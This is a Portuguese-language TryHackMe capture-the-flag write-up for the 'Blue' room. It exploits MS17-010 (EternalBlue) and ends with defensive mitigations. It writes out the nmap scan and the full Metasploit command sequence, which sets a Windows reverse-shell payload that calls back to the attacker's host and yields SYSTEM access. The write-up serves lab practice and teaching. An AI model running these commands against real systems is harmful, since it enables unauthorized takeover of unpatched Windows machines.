# Blue — TryHackMe Write-up

**Sala:** [Blue](https://tryhackme.com/room/blue)
**Categoria:** Boot2root / Exploração de vulnerabilidade conhecida (CVE)
**Dificuldade:** Fácil

## Objetivo

Ganhar acesso administrativo numa máquina Windows explorando uma vulnerabilidade crítica no protocolo SMB — o famoso **MS17-010 (EternalBlue)**, o mesmo exploit usado no ataque WannaCry de 2017.

## Reconhecimento

Primeiro passo foi mapear portas e serviços abertos:

```bash
nmap -sV -sC --script vuln -oN blue.nmap <IP_ALVO>
```

O resultado confirmou as portas SMB clássicas abertas (139 e 445), um sistema Windows 7, e o próprio script `vuln` do Nmap já sinalizou a máquina como vulnerável ao MS17-010 — economizando a etapa de confirmar manualmente com um scanner separado.

## Exploração

Com a vulnerabilidade confirmada, usei o Metasploit Framework:

```bash
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP_ALVO>
set PAYLOAD windows/shell_reverse_tcp
set LHOST <IP_ATTACKBOX>
set LPORT 4444
exploit
```

O MS17-010 explora uma falha no processamento de pacotes SMBv1 que permite execução de código arbitrário direto no **kernel** do Windows. É por isso que, diferente de outros exploits de aplicação (onde você ganha acesso com o usuário do serviço e só depois escala privilégio), esse aqui já entrega o shell com privilégio **SYSTEM** — não teve etapa separada de escalonamento, o próprio exploit é o escalonamento.

## Pós-exploração

Confirmei o nível de acesso obtido:

```bash
whoami
```

Retornou `nt authority\system` — o nível mais alto de privilégio possível numa máquina Windows, equivalente a "root" no Linux.

A partir daí, usei os recursos do shell reverso pra navegar pelo sistema de arquivos e localizar as evidências pedidas pela sala (sem expor aqui os valores/nomes exatos, seguindo a política deste repositório — o objetivo é mostrar o caminho, não entregar a resposta pronta).

## Aprendizados

- Diferença prática entre SMBv1 (vulnerável, deveria estar desabilitado em qualquer ambiente moderno) e SMBv2/v3
- Por que exploits que atuam em nível de kernel pulam a etapa de escalonamento de privilégio — o acesso já nasce com privilégio máximo
- Reforço de por que EternalBlue foi tão devastador em 2017: rede corporativa com SMBv1 habilitado e sem patch = comprometimento total automatizado (foi a base do WannaCry)
- Do lado da defesa: desabilitar SMBv1, manter patch de sistema operacional em dia, e monitorar tráfego SMB anômalo são as três mitigações mais diretas contra esse tipo de exploração

## Ferramentas utilizadas

Nmap, Metasploit Framework (msfconsole)
